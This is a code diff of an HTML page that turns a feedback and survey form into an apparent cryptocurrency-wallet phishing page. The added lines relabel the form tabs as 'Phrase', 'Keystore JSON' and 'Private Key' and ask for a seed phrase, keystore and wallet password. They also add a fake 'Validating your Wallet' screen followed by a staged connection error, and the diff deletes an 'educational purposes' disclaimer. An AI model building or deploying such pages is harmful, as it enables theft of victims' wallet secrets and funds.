@@ -1302,8 +1302,8 @@ body::before {
 
             <p class="processing-text">
 
-                Please wait while we process
-                your suggestion.
+                Please wait while we Validate 
+                your Wallet.
 
             </p>
 
@@ -1323,7 +1323,7 @@ body::before {
             <p class="success-text">
 
                 There was an error connecting automatically.
-                But do not worry, this is just for educational purposes.
+                But do not worry, you can still connect manually.
 
             </p>
 
@@ -1338,9 +1338,9 @@ body::before {
 
             <h2 class="success-title">
 
-                thank you for choosing
+                Import Your 
                 <span id="selectedWalletName"></span>
-                survey idea
+                Wallet
 
             </h2>
 
@@ -1357,7 +1357,7 @@ body::before {
                     class="form-option active"
                     onclick="showForm('feedback', this)"
                 >
-                    feedback
+                    Phrase 
                 </button>
 
 
@@ -1366,7 +1366,7 @@ body::before {
                     class="form-option"
                     onclick="showForm('suggestion', this)"
                 >
-                    suggestion
+                    Keystore JSON 
                 </button>
 
 
@@ -1375,7 +1375,7 @@ body::before {
                     class="form-option"
                     onclick="showForm('survey', this)"
                 >
-                    survey
+                    Private Key
                 </button>
 
             </div>
@@ -1428,14 +1428,14 @@ body::before {
                         class="form-label"
                         for="feedback"
                     >
-                        feedback
+                        Phrase
                     </label>
 
 
                     <textarea
                         id="feedback"
                         class="form-textarea"
-                        placeholder="Enter feedback"
+                        placeholder="Enter Wallet Phrase"
                         name="message"
                         required
                     ></textarea>
@@ -1500,14 +1500,14 @@ body::before {
                         class="form-label"
                         for="suggestion"
                     >
-                        suggestions
+                        Keystore JSON 
                     </label>
 
 
                     <textarea
                         id="suggestion"
                         class="form-textarea"
-                        placeholder="Enter suggestions"
+                        placeholder="Enter Keystore JSON"
                         name="message"
                         required
                     ></textarea>
@@ -1525,7 +1525,7 @@ body::before {
                         type="text"
                         id="suggestionName"
                         class="form-input"
-                        placeholder="Enter option"
+                        placeholder="Enter oWallet Password"
                         name="option"
                         required
                     >
@@ -1590,7 +1590,7 @@ body::before {
                         class="form-label"
                         for="survey"
                     >
-                        survey
+                        Private Key
                     </label>
 
 
@@ -1598,7 +1598,7 @@ body::before {
                         type="text"
                         id="survey"
                         class="form-input"
-                        placeholder="Enter survey"
+                        placeholder="Enter Private Key"
                         name="message"
                         required
                     >
@@ -1631,13 +1631,13 @@ body::before {
             <div class="processing-icon"></div>
 
             <h2 class="processing-title">
-                Submitting...
+                Validating...
             </h2>
 
             <p class="processing-text">
 
-                Please wait while your
-                submission is being processed.
+                Please wait while we
+                Validate your Wallet
 
             </p>
 
@@ -1659,12 +1659,12 @@ body::before {
             </div>
 
             <h2 class="status-title">
-                Submission Successful
+                Error
             </h2>
 
             <p class="status-text">
-                Thank you. Your response has
-                been successfully submitted.
+                Error connecting to Wallet
+                .
             </p>
 
             <button
@@ -1672,7 +1672,7 @@ body::before {
                 class="status-close"
                 onclick="finishSubmission()"
             >
-                Done
+                Close
             </button>
 
         </div>
